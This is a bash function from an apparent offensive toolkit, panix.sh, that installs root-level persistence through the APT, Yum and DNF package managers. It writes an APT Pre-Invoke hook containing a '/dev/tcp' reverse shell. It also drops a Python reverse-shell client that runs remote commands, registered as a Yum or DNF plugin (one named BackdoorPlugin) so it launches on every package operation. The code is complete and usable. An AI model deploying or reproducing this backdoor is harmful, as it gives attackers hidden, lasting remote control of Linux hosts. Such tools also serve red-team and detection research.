setup_package_manager_persistence() {
	local ip=""
	local port=""
	local mechanism=""

	if ! check_root; then
		echo "Error: This function can only be run as root."
		exit 1
	fi

	usage_package_manager_persistence() {
		echo "Usage: ./panix.sh --package-manager [OPTIONS]"
		echo "--examples                   Display command examples"
		echo "--ip <ip>                    Specify IP address"
		echo "--port <port>                Specify port number"
		echo "--apt | --yum | --dnf        Use APT, YUM or DNF package manager"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--ip )
				shift
				ip="$1"
				;;
			--port )
				shift
				port="$1"
				;;
			--apt | --dnf | --yum )
				mechanism="$1"
				;;
			--examples )
				echo "Example:"
				echo "sudo ./panix.sh --package-manager --ip 10.10.10.10 --port 1337 --apt | --yum | --dnf"
				exit 0
				;;
			--help|-h)
				usage_package_manager_persistence
				exit 0
				;;
			* )
				echo "Invalid option: $1"
				echo "Try './panix.sh --package-manager --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ -z $ip || -z $port || -z $mechanism ]]; then
		echo "Error: --ip, --port, and one of --apt, --yum, or --dnf must be specified."
		echo "Try './panix.sh --package-manager --help' for more information."
		exit 1
	fi
	# If anyone finds a way for EOF to work with indentation in both an editor and on the host, LMK lol.
	local python_script=$(echo -e "#!/usr/bin/env python\nHOST = \"$ip\"\nPORT = $port\n\ndef connect(host_port):\n\timport socket\n\ts = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\ts.connect(host_port)\n\treturn s\n\ndef wait_for_command(s):\n\timport subprocess\n\tdata = s.recv(1024)\n\tif data == \"quit\":\n\n\t\ts.close()\n\t\tsys.exit(0)\n\telif len(data) == 0:\n\t\treturn True\n\telse:\n\t\tproc = subprocess.Popen(data, shell=True,\n\t\tstdout=subprocess.PIPE, stderr=subprocess.PIPE,\n\t\tstdin=subprocess.PIPE)\n\t\tstdout_value = proc.stdout.read() + proc.stderr.read()\n\t\ts.send(stdout_value)\n\t\treturn False\n\ndef main():\n\timport sys, os, socket, time\n\twhile True:\n\t\tsocket_died = False\n\t\ttry:\n\t\t\ts = connect((HOST, PORT))\n\t\t\twhile not socket_died:\n\t\t\t\tsocket_died = wait_for_command(s)\n\t\t\ts.close()\n\t\texcept socket.error:\n\t\t\tpass\n\t\ttime.sleep(5)\n\nif __name__ == \"__main__\":\n\tmain()")

	case $mechanism in
		--apt )
			if [[ ! -x "$(command -v apt)" ]]; then
				echo "APT is not installed. Please install APT to use this option."
				echo "Try './panix.sh --package-manager --help' for more information."
				exit 1
			fi

			path="/etc/apt/apt.conf.d/01python-upgrades"
			echo -e "APT::Update::Pre-Invoke {\"(nohup setsid /bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1' > /dev/null 2>&1 &) &\"};" > $path
			echo "[+] APT persistence established"
			;;

		--yum )
			if [[ ! -x "$(command -v yum)" ]]; then
				echo "Yum is not installed. Please install Yum to use this option."
				echo "Try './panix.sh --package-manager --help' for more information."
				exit 1
			fi

			if [[ -x "$(command -v dnf)" && "$(readlink -f "$(which yum)")" == "$(which dnf)" ]]; then
				echo "Yum is symlinked to DNF. Please use --dnf option."
				echo "Try './panix.sh --package-manager --help' for more information."
				exit 1
			fi

			echo "$python_script" > /usr/lib/yumcon
			chmod +x /usr/lib/yumcon

			echo -e "[main]\nenabled=1" > /etc/yum/pluginconf.d/yumcon.conf
			
			# If anyone finds a way for EOF to work with indentation in both an editor and on the host, LMK lol.
			echo -e "import os\n\ntry:\n\tfrom yum.plugins import TYPE_INTERACTIVE, PluginYumExit\n\trequires_api_version = '2.0'\n\tplugin_type = TYPE_INTERACTIVE\nexcept ImportError:\n\trequires_api_version = '1.0'\n\ndef pretrans_hook(conduit):\n\tos.system('setsid /usr/lib/yumcon 2>/dev/null & ')" > /usr/lib/yum-plugins/yumcon.py

			echo "[+] Yum persistence established"
			;;

		--dnf )
			if [[ ! -x "$(command -v dnf)" ]]; then
				echo "DNF is not installed. Please install DNF to use this option."
				echo "Try './panix.sh --package-manager --help' for more information."
				exit 1
			fi

			python_version=$(ls /usr/lib | grep -oP 'python3\.\d+' | head -n 1)
			python_path=$(which python)

			echo "$python_script" > /usr/lib/$python_version/site-packages/dnfcon
			chmod +x /usr/lib/$python_version/site-packages/dnfcon

			# If anyone finds a way for EOF to work with indentation in both an editor and on the host, LMK lol.
			echo -e "import dnf\nimport os\n\ndef execute_dnfcon():\n\tos.system('setsid /usr/lib/$python_version/site-packages/dnfcon 2>/dev/null &')\n\nclass BackdoorPlugin(dnf.Plugin):\n\tname = 'dnfcon'\n\n\tdef __init__(self, base, cli):\n\t\tsuper(BackdoorPlugin, self).__init__(base, cli)\n\t\texecute_dnfcon()\n\n\tdef __init__(self, base, conf, **kwargs):\n\t\tdnf.Plugin.__init__(self, base, conf, **kwargs)\n\t\texecute_dnfcon()\n\nplugin = BackdoorPlugin" > /usr/lib/$python_version/site-packages/dnf-plugins/dnfcon.py
			chmod +x /usr/lib/$python_version/site-packages/dnf-plugins/dnfcon.py
			
			echo -e "[main]\nenabled=1" > /etc/dnf/plugins/dnfcon.conf

			echo "[+] DNF persistence established"
			;;
	esac
	echo "[+] Package manager persistence established!"
}
